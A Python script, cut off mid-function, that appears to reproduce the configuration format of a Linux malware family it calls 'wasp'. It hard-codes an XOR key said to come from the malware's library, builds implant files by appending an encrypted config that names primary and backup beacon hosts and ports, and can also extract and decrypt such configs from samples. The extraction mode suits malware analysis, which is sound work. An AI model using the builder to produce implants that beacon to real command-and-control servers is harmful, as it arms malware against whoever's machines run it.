#!/usr/bin/env python3
from __future__ import annotations

import argparse
import struct
import json
from urllib.parse import urlparse

from datetime import datetime

from typing import Optional, Dict

from pathlib import Path

import constants

# This comes from the "SimplePassword" class in libse1linux (0fe1248ecab199bee383cef69f2de77d33b269ad1664127b366a4e745b1199c8)
cypher_bytes = b'\xf7\xe0\xc9\xb2\x9b\x84\x6d\x56\x3f\x28\x11\xf9\xe2\xcb\xb4\x9d\x86\x6f\x58\x41\x2a\x13\xfb\xe4\xcd\xb6\x9f\x88\x71\x5a\x43\x2c\x15\xfd\xe6\xcf\xb8\xa1\x8a\x73\x5c\x45\x2e\x17\x00\xe8\xd1\xba\xa3\x8c\x75\x5e\x47\x30\x19\x02\xea\xd3\xbc\xa5\x8e\x77\x60\x49\x32\x1b\x04\xec\xd5\xbe\xa7\x90\x79\x62\x4b\x34\x1d\x06\xee\xd7\xc0\xa9\x92\x7b\x64\x4d\x36\x1f\x08\xf0\xd9\xc2\xab\x94\x7d\x66\x4f\x38\x21\x0a\xf2\xdb\xc4\xad\x96\x7f\x68\x51\x3a\x23\x0c\xf4\xdd\xc6\xaf\x98\x81\x6a\x53\x3c\x25\x0e\xf6\xdf\xc8\xb1\x9a\x83\x6c\x55\x3e\x27\x10\xf8\xe1\xca\xb3\x9c\x85\x6e\x57\x40\x29\x12\xfa\xe3\xcc\xb5\x9e\x87\x70\x59\x42\x2b\x14\xfc\xe5\xce\xb7\xa0\x89\x72\x5b\x44\x2d\x16\xfe\xe7\xd0\xb9\xa2\x8b\x74\x5d\x46\x2f\x18\x01\xe9\xd2\xbb\xa4\x8d\x76\x5f\x48\x31\x1a\x03\xeb\xd4\xbd\xa6\x8f\x78\x61\x4a\x33\x1c\x05\xed\xd6\xbf\xa8\x91\x7a\x63\x4c\x35\x1e\xef\xd8\xc1\xaa\x93\x7c\x65\x4e\x37\x20\x09\xf1\xda\xc3\xac\x95\x7e\x67\x50\x39\x22\x0b\xf3\xdc\xc5\xae\x97\x80\x69\x52\x3b\x24\x0d\xf5\xde\xc7\xb0\x99\x82\x6b\x54\x3d\x26\x0f\xf7'

class WaspBuildConfiguration(object):
    """ A particular build of a Wasp """
    beacon_url: str
    backup_beacon_url: str

    def __init__(
            self,
            beacon_url: str,
            backup_beacon_url: str,
            ) -> None:
        self.beacon_url = beacon_url
        self.backup_beacon_url = backup_beacon_url

    @property
    def beacon_hostname(self) -> str:
        hostname = urlparse(self.beacon_url).hostname
        if hostname is None:
            raise ValueError("Beacon URL must have a hostname")
        return hostname

    @property
    def beacon_port(self) -> int:
        port = urlparse(self.beacon_url).port
        if port is None:
            raise ValueError("Beacon URL must have a port")
        return port

    @property
    def backup_beacon_hostname(self) -> str:
        hostname = urlparse(self.backup_beacon_url).hostname
        if hostname is None:
            raise ValueError("Backup beacon URL must have a hostname")
        return hostname

    @property
    def backup_beacon_port(self) -> int:
        port = urlparse(self.backup_beacon_url).port
        if port is None:
            raise ValueError("Backup beacon URL must have a port")
        return port

    @classmethod
    def from_json(cls, json_string: str | bytes) -> WaspBuildConfiguration:
        """ Create a WaspBuildConfiguration from a JSON string """
        return cls.from_dict(json.loads(json_string))

    @classmethod
    def from_dict(cls, json: Dict) -> WaspBuildConfiguration:
        """ Create a WaspBuildConfiguration from a dictionary """
        try:
            primary: Dict = json["Master"]
            domain: str = primary.get("Domain", primary["IP"])
            port: int = primary["Port"]
            beacon_url: str = f"wasp://{domain}:{port}"

            backup: Dict = json["Standby"]
            domain: str = backup.get("Domain", backup["IP"])
            port: int = backup["Port"]
            backup_beacon_url:str = f"wasp://{domain}:{port}"

            return cls(beacon_url, backup_beacon_url)
        except KeyError as e:
            raise ValueError(f"Invalid wasp configuration. Missing key {e.args}")


def build_wasp(
        configuration: WaspBuildConfiguration,
        output_path: Optional[Path] = None,
        ) -> Path:
    """ Build a wasp with the given configuration and return the path to the built wasp """

    base_bytes = constants.WASP_BASE_BUILD.read_bytes()
    config = {
        "Master": {
            "Domain": configuration.beacon_hostname,
            #"IP": "127.0.0.1",
            "Port": configuration.beacon_port
        },
        "Standby": {
            "Domain": configuration.backup_beacon_hostname,
            #"IP": "127.0.0.1",
            "Port": configuration.backup_beacon_port,
        }
    }

    config_json = json.dumps(config).encode('utf-8')
    encrypted_config_json = b''
    for index, b in enumerate(config_json):
        # Not sure if the real implementation does the modulo
        encrypted_config_json += struct.pack("B", (config_json[index] ^ cypher_bytes[index % len(cypher_bytes)]))

    # Pack a struct with the flags, config length, config
    flags = 0
    config_length = len(config_json)
    magic = b'nu11'
    header_len = len(magic) + 4 + len(magic)
    footer_size = 255 - header_len
    wasp_config_struct = magic + struct.pack('!I', config_length) + magic + struct.pack(f'{footer_size}s', encrypted_config_json)

    # if the user did not specify an output path, we'll generate one
    if not output_path:
        date_str = datetime.utcnow().strftime("%Y%m%d%H%M%S")
        output_path = constants.WASP_BUILDS_PATH / f"wasp-{date_str}"
    output_path.parent.mkdir(parents=True, exist_ok=True)

    output_path.write_bytes(base_bytes + wasp_config_struct)
    Path(str(output_path) + ".config.json").write_bytes(config_json)
    return output_path


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--unpack', action='store_true', help='Invert')
    parser.add_argument('--strip-config', action='store_true', help='Output the base file without the config blob')
    parser.add_argument("BASE_FILE", help="The file to hide our config in", type=Path)
    parser.add_argument("OUTPUT_FILE", help="The file to save the config", type=Path)
    args = parser.parse_args()


    # Read the base file to hide in
    base_bytes: bytes = args.BASE_FILE.read_bytes()

    if args.unpack:
        magic = b'nu11'

        second_null = base_bytes.rfind(magic)
        first_null = base_bytes.rfind(magic, 0, second_null)
        header_start = first_null
        print(f"Header starts at byte {header_start}")

        header_len = len(magic) + 4 + len(magic)
        size = header_len + 255
        config_footer = base_bytes[header_start:]
        print(config_footer)
        null, size, null = struct.unpack('!4sI4s', config_footer[:header_len])
        print(f"Size: {size}")
        config_blob = struct.unpack(f'{size}s', config_footer[header_len:header_len+size])[0]
        print(config_blob)
        decrypted_config_json = b''
        for index, b in enumerate(config_blob):
            # Not sure if the real implementation does the modulo
            decrypted_config_json += struct.pack("B", (config_blob[index] ^ cypher_bytes[index % len(cypher_bytes)]))
        config_json = json.loads(decrypted_config_json.decode('utf-8'))
        print(config_json)
        if args.strip_config:
            args.OUTPUT_FILE.write_bytes(base_bytes[:header_start])
        else:
            args.OUTPUT_FILE.write_bytes(decrypted_config_json)
        
    if not args.unpack:
        # Generate our configuration



